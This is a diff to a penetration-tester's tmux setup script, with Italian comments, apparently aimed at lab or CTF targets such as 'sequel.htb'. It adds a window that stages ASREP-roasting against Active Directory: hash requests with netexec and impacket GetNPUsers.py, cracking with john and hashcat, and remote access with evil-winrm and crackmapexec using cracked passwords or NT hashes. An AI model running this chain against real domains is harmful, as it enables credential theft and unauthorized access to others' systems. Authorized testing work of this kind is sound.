@@ -1892,6 +1892,50 @@ tmux send-keys -t PT:11.3 "# Kerberos-Enumeration: Verify valid username with ke
 tmux send-keys -t PT:11.3 "/home/kali/.local/bin/kerbrute -users users.txt -dc-ip $ip -domain $domain "
 cd $folderProject
 
+cd $folderProjectAuthN
+# Kerberos - ASREP-roasting
+tmux new-window -t PT:12 -n 'Kerberos - ASREP-roasting'
+tmux split-window -v -t PT:12.0
+tmux select-pane -t "12.0"
+tmux split-window -h -t "12.0"
+tmux split-window -h -t "12.0"
+tmux split-window -h -t "12.0"
+tmux split-window -h -t "12.0"
+tmux split-window -v -t PT:12.5
+tmux select-pane -t "12.5"
+tmux split-window -h -t "12.5"
+tmux split-window -v -t PT:12.7
+tmux select-pane -t "12.7"
+tmux split-window -h -t "12.7"
+tmux split-window -h -t "12.7"
+tmux split-window -h -t "12.7"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:12.0 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
+tmux send-keys -t PT:12.0 "netexec ldap $ip -u users.txt -p '' --asreproast"
+tmux send-keys -t PT:12.1 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
+tmux send-keys -t PT:12.1 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -no-pass -usersfile user.txt -outputfile asrep.txt -format john"
+tmux send-keys -t PT:12.2 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with MORE USERNAME" Enter
+tmux send-keys -t PT:12.2 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
+tmux send-keys -t PT:12.3 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with SINGLE USERNAME" Enter
+tmux send-keys -t PT:12.3 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
+tmux send-keys -t PT:12.4 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with SINGLE USERNAME" Enter
+tmux send-keys -t PT:12.4 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip $ip -request 'sequel.htb/user1' -format hashcat -outputfile ~/my.hash"
+tmux send-keys -t PT:12.5 "# Kerberos-ASREP-roasting: Crack token TGT with John The Ripper" Enter
+tmux send-keys -t PT:12.5 "john asrep.txt --wordlist=/path/to/wordlist"
+tmux send-keys -t PT:12.6 "# Kerberos-ASREP-roasting: Crack token TGT with hashcat" Enter
+tmux send-keys -t PT:12.6 "hashcat -m 18200 -d 3 -a 0 my.hash rockyou.txt"
+tmux send-keys -t PT:12.7 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
+tmux send-keys -t PT:12.7 "evil-winrm -i $ip -u <utente> -p <password>"
+tmux send-keys -t PT:12.8 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
+tmux send-keys -t PT:12.8 "crackmapexec smb $ip -u <utente> -p <password> -x "<comando>""
+tmux send-keys -t PT:12.9 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
+tmux send-keys -t PT:12.9 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
+tmux send-keys -t PT:12.10 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
+tmux send-keys -t PT:12.10 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
+
+
+
+cd $folderProject
 
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
